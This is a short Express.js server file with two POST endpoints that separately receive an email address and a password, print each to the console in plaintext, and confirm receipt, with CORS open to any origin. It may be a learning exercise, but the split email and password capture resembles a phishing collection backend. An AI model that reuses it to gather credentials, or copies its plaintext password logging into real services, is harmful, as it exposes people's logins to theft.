import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';

const port = process.env.PORT || 5000;
const app = express();
app.use(cors())

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json()); // Add this line to parse JSON requests

app.get('/', (req, res) => {
    console.log('A new request');
    res.send('Hello from server main page');
});

app.post('/post_email', async (req, res) => {
    let { email } = req.body;
    console.log(email);
    res.send('Email received'); // Add this line to send a response back to the client
});

app.post('/post_password', async (req, res) => {
    let { password } = req.body;
    console.log(password);
    res.send('Password received'); // Add this line to send a response back to the client
});

app.listen(port, () => {
    console.log(`Server is running on port: ${port}`);
});
